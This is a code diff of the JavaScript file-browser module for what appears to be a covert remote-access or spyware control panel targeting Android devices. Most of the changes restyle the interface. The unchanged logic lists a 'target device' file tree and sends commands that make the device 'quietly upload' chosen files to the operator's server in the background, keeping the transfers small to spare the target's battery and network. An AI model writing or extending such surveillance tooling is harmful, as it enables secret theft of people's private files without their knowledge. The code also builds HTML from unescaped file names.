@@ -1,7 +1,7 @@
 class FilesEngine {
     constructor() {
         this.activeDeviceId = localStorage.getItem('active_device_id');
-        this.currentPath = '/'; // Root directory se start
+        this.currentPath = '/';
         this.init();
     }
 
@@ -14,7 +14,12 @@ class FilesEngine {
         const token = localStorage.getItem('owner_token');
         const container = document.getElementById('files-list');
         
-        container.innerHTML = '<div style="color: #888; text-align: center; grid-column: 1 / -1; padding: 40px;">Fetching metadata tree...</div>';
+        container.innerHTML = `
+            <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
+                <i data-lucide="loader" class="spin" style="width: 40px; height: 40px; margin-bottom: 15px;"></i><br>
+                Fetching directory tree...
+            </div>`;
+            
         document.getElementById('path-breadcrumb').style.display = 'flex';
 
         try {
@@ -28,11 +33,11 @@ class FilesEngine {
                 this.updateBreadcrumb(path);
                 this.renderFiles(result.data);
             } else {
-                container.innerHTML = `<div style="color: #ff3b30; text-align: center; grid-column: 1 / -1;">Error: ${result.message}</div>`;
+                container.innerHTML = `<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px;">System Error: ${result.message}</div>`;
             }
         } catch (e) {
             console.error("Storage Engine Error:", e);
-            container.innerHTML = '<div style="color: #ff3b30; text-align: center; grid-column: 1 / -1;">Network failure while reading file system.</div>';
+            container.innerHTML = '<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px;">Network failure while establishing file tunnel.</div>';
         }
     }
 
@@ -40,50 +45,57 @@ class FilesEngine {
         const container = document.getElementById('files-list');
         
         if (items.length === 0) {
-            container.innerHTML = '<div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 40px;">This folder is empty.</div>';
+            container.innerHTML = `
+                <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
+                    <i data-lucide="folder-open" style="width: 48px; height: 48px; opacity: 0.3; margin-bottom: 10px;"></i><br>
+                    Directory is empty.
+                </div>`;
+            lucide.createIcons();
             return;
         }
 
         container.innerHTML = items.map(item => {
             const isFolder = item.is_directory === true || item.type === 'directory';
             const icon = isFolder ? 'folder' : this.getFileIcon(item.file_name);
-            const iconColor = isFolder ? 'var(--accent-cyan)' : '#e2e8f0';
+            const iconColor = isFolder ? 'var(--accent-cyan)' : 'var(--text-main)';
             
-            // 🚀 SMART LOGIC: Check Size Constraint (12 MB = 12582912 bytes)
+            // Limit strictness: 12MB
             const sizeInBytes = item.size_bytes || 0;
             const sizeLimit = 12 * 1024 * 1024; 
             const isOversized = !isFolder && sizeInBytes > sizeLimit;
             
             let clickAction = '';
-            let cardOpacity = isOversized ? '0.4' : '1';
+            let extraClass = '';
             let badgeHtml = '';
 
             if (isFolder) {
                 clickAction = `filesEngine.openFolder('${item.file_name}')`;
             } else if (isOversized) {
-                clickAction = `alert('Strict Policy: File exceeds 12MB limit. Extraction blocked to save target bandwidth.')`;
-                badgeHtml = `<div style="color: #ff3b30; font-size: 0.6rem; font-weight: bold; margin-top: 5px;">> 12MB BLOCKED</div>`;
+                clickAction = `alert('Strict Policy: File exceeds 12MB limit. Action blocked to conserve target network and battery.')`;
+                extraClass = 'blocked';
+                badgeHtml = `<span class="status-badge badge-blocked">Size Limit</span>`;
             } else {
-                // Determine full path to send to Android
                 const fullPath = this.currentPath === '/' ? `/${item.file_name}` : `${this.currentPath}/${item.file_name}`;
-                // Pass URL if it's already uploaded
                 const fileUrl = item.file_url ? `'${item.file_url}'` : 'null';
                 clickAction = `filesEngine.downloadOrRequestFile('${item.file_name}', '${fullPath}', ${fileUrl})`;
                 
                 if (item.file_url) {
-                    badgeHtml = `<div style="color: #4caf50; font-size: 0.6rem; font-weight: bold; margin-top: 5px;">READY ON SERVER</div>`;
+                    badgeHtml = `<span class="status-badge badge-ready">Ready</span>`;
+                } else {
+                    badgeHtml = `<span class="status-badge badge-cloud"><i data-lucide="cloud-download" style="width:12px; height:12px;"></i></span>`;
                 }
             }
 
-            // Convert size for UI
-            let displaySize = isFolder ? 'Folder' : ((sizeInBytes / (1024 * 1024)).toFixed(2) + ' MB');
+            const displaySize = isFolder ? 'Folder' : ((sizeInBytes / (1024 * 1024)).toFixed(2) + ' MB');
 
             return `
-            <div class="file-item" onclick="${clickAction}" style="opacity: ${cardOpacity};">
-                <i data-lucide="${icon}" class="file-icon" style="color: ${iconColor};"></i>
-                <div class="file-name" title="${item.file_name}">${item.file_name}</div>
-                <div style="font-size: 0.7rem; color: #888; margin-top: 5px;">${displaySize}</div>
+            <div class="file-item ${extraClass}" onclick="${clickAction}">
                 ${badgeHtml}
+                <i data-lucide="${icon}" class="file-icon" style="color: ${iconColor};"></i>
+                <div style="width: 100%;">
+                    <div class="file-name" title="${item.file_name}">${item.file_name}</div>
+                    <div class="file-meta">${displaySize}</div>
+                </div>
             </div>
             `;
         }).join('');
@@ -94,13 +106,13 @@ class FilesEngine {
     getFileIcon(filename) {
         if (!filename) return 'file';
         const ext = filename.split('.').pop().toLowerCase();
-        const imageExts = ['jpg', 'jpeg', 'png', 'gif'];
-        const vidExts = ['mp4', 'mkv', 'avi'];
-        const docExts = ['pdf', 'doc', 'docx', 'txt'];
-        const archiveExts = ['zip', 'rar', 'apk'];
+        const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
+        const vidExts = ['mp4', 'mkv', 'avi', 'mov'];
+        const docExts = ['pdf', 'doc', 'docx', 'txt', 'csv'];
+        const archiveExts = ['zip', 'rar', 'apk', 'tar'];
 
         if (imageExts.includes(ext)) return 'image';
-        if (vidExts.includes(ext)) return 'video';
+        if (vidExts.includes(ext)) return 'film';
         if (docExts.includes(ext)) return 'file-text';
         if (archiveExts.includes(ext)) return 'package';
         return 'file';
@@ -120,26 +132,22 @@ class FilesEngine {
     }
 
     updateBreadcrumb(path) {
-        const displayPath = path === '/' ? '/ Internal Storage' : '/ Internal Storage' + path;
-        document.getElementById('current-path-text').innerText = displayPath;
+        document.getElementById('current-path-text').innerText = path;
     }
 
-    // 🚀 NEW: THE ON-DEMAND EXTRACTOR ENGINE
     async downloadOrRequestFile(fileName, fullPath, fileUrl) {
         if (fileUrl && fileUrl.startsWith('http')) {
-            // File is already extracted. Open directly.
             window.open(fileUrl, '_blank');
             return;
         }
 
-        const isConfirmed = confirm(`File is not on server.\nCommand target device to upload "${fileName}" quietly in the background?`);
+        const isConfirmed = confirm(`Trigger remote extraction?\n\nTarget device will quietly upload "${fileName}" to the server in the background.`);
         if (!isConfirmed) return;
 
         const token = localStorage.getItem('owner_token');
         const deviceId = this.activeDeviceId;
 
         try {
-            // Injecting specific file upload command into target's polling queue
             const res = await fetch(`/api/devices/${deviceId}/action`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
@@ -150,7 +158,7 @@ class FilesEngine {
 
             const data = await res.json();
             if (data.status === 'success') {
-                alert(`Extraction command dispatched! Target device will upload the file on next cycle. Refresh this page in 1 minute.`);
+                alert(`Extraction command pushed to target queue!\nWait a minute and refresh to access the file.`);
             } else {
                 alert(`Command Failed: ${data.message}`);
             }
@@ -164,7 +172,7 @@ class FilesEngine {
 window.filesEngine = null;
 
 window.requestStorageSync = async function() {
-    const isConfirmed = confirm("Send command to target device to re-scan its internal storage and send updated file metadata?");
+    const isConfirmed = confirm("Send command to target device to re-index its file system? This may take a few moments.");
     if (!isConfirmed) return;
 
     const token = localStorage.getItem('owner_token');
@@ -176,7 +184,7 @@ window.requestStorageSync = async function() {
             headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
             body: JSON.stringify({ action: "sync_file_tree" })
         });
-        alert("Command queued. Metadata tree will update on the next polling cycle.");
+        alert("Deep Scan initiated. Metadata tree will update shortly.");
     } catch (e) {
         alert("Failed to queue command.");
     }
